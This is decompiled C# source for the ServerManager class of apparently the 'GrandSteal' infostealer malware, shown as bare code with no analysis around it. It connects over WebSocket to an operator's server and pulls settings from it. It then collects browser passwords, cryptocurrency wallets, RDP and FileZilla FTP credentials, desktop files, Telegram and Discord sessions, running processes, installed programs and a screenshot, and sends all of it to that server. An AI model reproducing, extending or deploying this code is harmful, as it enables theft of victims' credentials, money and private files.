using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading;
using GrandSteal.Client.Data.Recovery;
using GrandSteal.Client.Models;
using GrandSteal.Client.Models.Credentials;
using GrandSteal.Client.Models.Extensions;
using GrandSteal.Client.Models.Extensions.Nulls;
using GrandSteal.SharedModels;
using GrandSteal.SharedModels.Communication;
using GrandSteal.SharedModels.Models;
using ProtoBuf.Meta;
using SuperSocket.ClientEngine;
using WebSocket4Net;

namespace GrandSteal.Client.Data.Server
{
	// Token: 0x0200000E RID: 14
	public class ServerManager
	{
		// Token: 0x17000014 RID: 20
		// (get) Token: 0x06000044 RID: 68 RVA: 0x00002281 File Offset: 0x00000481
		public Dictionary<System.Func<RequestBase, bool>, System.Action<RequestBase, WebSocket>> Handlers { get; }

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x06000045 RID: 69 RVA: 0x00002289 File Offset: 0x00000489
		public string Host { get; }

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x06000046 RID: 70 RVA: 0x00002291 File Offset: 0x00000491
		public WebSocket Server { get; }

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x06000047 RID: 71 RVA: 0x00002299 File Offset: 0x00000499
		// (set) Token: 0x06000048 RID: 72 RVA: 0x000022A1 File Offset: 0x000004A1
		public bool Running { get; private set; }

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x06000049 RID: 73 RVA: 0x000022AA File Offset: 0x000004AA
		public IList<ICredentialsManager<BrowserProfile>> BrowserCredentialsManagers { get; }

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x0600004A RID: 74 RVA: 0x000022B2 File Offset: 0x000004B2
		public IList<ICredentialsManager<ColdWallet>> ColdWalletManagers { get; }

		// Token: 0x1700001A RID: 26
		// (get) Token: 0x0600004B RID: 75 RVA: 0x000022BA File Offset: 0x000004BA
		public IList<ICredentialsManager<RdpCredential>> RdpManagers { get; }

		// Token: 0x1700001B RID: 27
		// (get) Token: 0x0600004C RID: 76 RVA: 0x000022C2 File Offset: 0x000004C2
		public IList<ICredentialsManager<FtpCredential>> FtpManagers { get; }

		// Token: 0x1700001C RID: 28
		// (get) Token: 0x0600004D RID: 77 RVA: 0x000022CA File Offset: 0x000004CA
		public IList<DesktopFileManager> DesktopFileManagers { get; }

		// Token: 0x0600004E RID: 78 RVA: 0x00003EC0 File Offset: 0x000020C0
		public ServerManager(string IP, string buildID)
		{
			ProtoHelper.PopulateTypes(typeof(RequestBase));
			ProtoHelper.PopulateTypes(typeof(ResponseBase));
			ProtoHelper.PopulateTypes(typeof(Request<CredentialsRequest>));
			ProtoHelper.PopulateTypes(typeof(Request<string>));
			ProtoHelper.PopulateTypes(typeof(Response<bool>));
			ProtoHelper.PopulateTypes(typeof(Response<GrandSteal.Client.Models.ClientSettings>));
			RuntimeTypeModel.Default.AutoAddMissingTypes = true;
			RuntimeTypeModel.Default.AutoCompile = false;
			RuntimeTypeModel.Default.CompileInPlace();
			this.BrowserCredentialsManagers = new List<ICredentialsManager<BrowserProfile>>
			{
				new ChromiumManager(null),
				new FirefoxBase()
			};
			this.ColdWalletManagers = new List<ICredentialsManager<ColdWallet>>
			{
				new ColdWalletManager()
			};
			this.RdpManagers = new List<ICredentialsManager<RdpCredential>>
			{
				new RdpManager()
			};
			this.FtpManagers = new List<ICredentialsManager<FtpCredential>>
			{
				new FileZillaManager()
			};
			this.DesktopFileManagers = new List<DesktopFileManager>
			{
				new DesktopFileManager()
			};
			this.BuildID = buildID;
			this.Handlers = new Dictionary<System.Func<RequestBase, bool>, System.Action<RequestBase, WebSocket>>();
			this.Host = string.Format("ws://{0}:{1}/websocket", IP, 2012);
			this.Server = new WebSocket(this.Host)
			{
				AutoSendPingInterval = 5000,
				EnableAutoSendPing = true,
				AllowUnstrustedCertificate = true
			};
			this.InitializeServer();
			Console.WriteLine("Server is initialized");
		}

		// Token: 0x0600004F RID: 79 RVA: 0x000022D2 File Offset: 0x000004D2
		public AsyncAction<bool> Start()
		{
			return AsyncTask.StartNew<bool>(delegate()
			{
				this.Server.Open();
				Console.WriteLine("Opening");
				while (!this.Running)
				{
					Thread.Sleep(100);
				}
				return true;
			});
		}

		// Token: 0x06000050 RID: 80 RVA: 0x000022E5 File Offset: 0x000004E5
		public void HandleWorkCompleted()
		{
			EventHandler onWorkCompleted = this.OnWorkCompleted;
			if (onWorkCompleted == null)
			{
				return;
			}
			onWorkCompleted(this, null);
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00004030 File Offset: 0x00002230
		private void InitializeServer()
		{
			this.Running = false;
			this.Server.DataReceived += delegate(object sender, DataReceivedEventArgs arguments)
			{
				try
				{
					if (arguments.Data.IsNotNull<byte[]>() && arguments.Data.Length != 0)
					{
						CommunicationObject communicationObject = arguments.Data.DeSerializeProto<CommunicationObject>();
						RequestBase requestBase;
						if ((requestBase = (communicationObject as RequestBase)) != null)
						{
							foreach (KeyValuePair<System.Func<RequestBase, bool>, System.Action<RequestBase, WebSocket>> keyValuePair in this.Handlers)
							{
								if (keyValuePair.Key(requestBase))
								{
									keyValuePair.Value(requestBase, this.Server);
								}
							}
						}
						ResponseBase response;
						if ((response = (communicationObject as ResponseBase)) != null)
						{
							response.HandleResponse();
						}
					}
				}
				catch (Exception arg)
				{
					Console.WriteLine("Invalid JsonMessage data from server. Exception : " + arg);
				}
			};
			this.Server.Opened += delegate(object sender, EventArgs eventArgs)
			{
				this.Running = true;
			};
			this.Server.MessageReceived += delegate(object sender, MessageReceivedEventArgs message)
			{
				Console.WriteLine(message.Message);
			};
			this.Server.Closed += delegate(object sender, EventArgs eventArgs)
			{
				Environment.Exit(0);
			};
			this.Server.Error += delegate(object sender, ErrorEventArgs eventArgs)
			{
				this.Running = false;
			};
		}

		// Token: 0x06000052 RID: 82 RVA: 0x000040E0 File Offset: 0x000022E0
		public bool SendCredentials()
		{
			bool result;
			try
			{
				GrandSteal.Client.Models.ClientSettings clientSettings = this.RecieveSettings().IsNull(new GrandSteal.Client.Models.ClientSettings());
				List<BrowserProfile> list = new List<BrowserProfile>();
				if (clientSettings.GrabBrowserCredentials)
				{
					foreach (ICredentialsManager<BrowserProfile> credentialsManager in this.BrowserCredentialsManagers)
					{
						list.AddRange(credentialsManager.GetAll());
					}
				}
				List<ColdWallet> list2 = new List<ColdWallet>();
				if (clientSettings.GrabColdWallets)
				{
					foreach (ICredentialsManager<ColdWallet> credentialsManager2 in this.ColdWalletManagers)
					{
						list2.AddRange(credentialsManager2.GetAll().IsNull(new List<ColdWallet>()));
					}
				}
				List<RdpCredential> list3 = new List<RdpCredential>();
				if (clientSettings.GrabRdp)
				{
					foreach (ICredentialsManager<RdpCredential> credentialsManager3 in this.RdpManagers)
					{
						list3.AddRange(credentialsManager3.GetAll().IsNull<IEnumerable<RdpCredential>>());
					}
				}
				List<DesktopFile> list4 = new List<DesktopFile>();
				if (clientSettings.GrabDesktopFiles)
				{
					foreach (DesktopFileManager desktopFileManager in this.DesktopFileManagers)
					{
						desktopFileManager.DesktopFileExtensions = clientSettings.DesktopExtensions;
						list4.AddRange(desktopFileManager.GetAll());
					}
				}
				List<FtpCredential> list5 = new List<FtpCredential>();
				if (clientSettings.GrabFtp)
				{
					foreach (ICredentialsManager<FtpCredential> credentialsManager4 in this.FtpManagers)
					{
						list5.AddRange(credentialsManager4.GetAll().IsNull<IEnumerable<FtpCredential>>());
					}
				}
				RemoteClientInformation remoteClientInformation = ClientInfoHelper.Create(this.BuildID);
				if (remoteClientInformation == null)
				{
					Environment.Exit(0);
				}
				CredentialsRequest objectToSend = new CredentialsRequest
				{
					ClientInformation = remoteClientInformation,
					BrowserProfiles = list,
					ColdWallets = list2,
					RdpConnections = list3,
					DesktopFiles = list4,
					FtpCredentials = list5,
					Telegram = (clientSettings.GrabTelegram ? TelegramManager.Extract() : new TelegramSession()),
					Discord = (clientSettings.GrabDiscord ? DiscordManager.Extract() : new DiscordSession()),
					ProcessList = ClientInfoHelper.ListOfProcesses(),
					InstalledPrograms = ClientInfoHelper.ListOfPrograms(),
					Screenshot = ClientInfoHelper.CaptureScreen()
				};
				result = this.Server.SendRequest(objectToSend, "Credentials", 600000)();
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000053 RID: 83 RVA: 0x000043F4 File Offset: 0x000025F4
		public GrandSteal.Client.Models.ClientSettings RecieveSettings()
		{
			GrandSteal.Client.Models.ClientSettings clientSettings = this.Server.SendRequest("", "ParseClientSettings", 600000)();
			clientSettings.DesktopExtensions = (clientSettings.DesktopExtensions ?? new BindingList<string>());
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append("GrabBrowserCredentials: ").Append(clientSettings.GrabBrowserCredentials).AppendLine().Append("GrabColdWallets: ").Append(clientSettings.GrabColdWallets).AppendLine().Append("GrabDesktopFiles: ").Append(clientSettings.GrabDesktopFiles).AppendLine().Append("GrabFtp: ").Append(clientSettings.GrabFtp).AppendLine().Append("GrabRdp: ").Append(clientSettings.GrabRdp).AppendLine().Append("GrabDiscord: ").Append(clientSettings.GrabDiscord).AppendLine().Append("GrabTelegram: ").Append(clientSettings.GrabTelegram).AppendLine().Append("Extensions: ").AppendLine(string.Join(new string(new char[]
			{
				','
			}), clientSettings.DesktopExtensions.ToArray<string>()));
			Console.WriteLine(stringBuilder.ToString());
			return clientSettings.IsNull(new GrandSteal.Client.Models.ClientSettings());
		}

		// Token: 0x0400002A RID: 42
		public EventHandler OnWorkCompleted;

		// Token: 0x0400002B RID: 43
		private readonly string BuildID;
	}
}
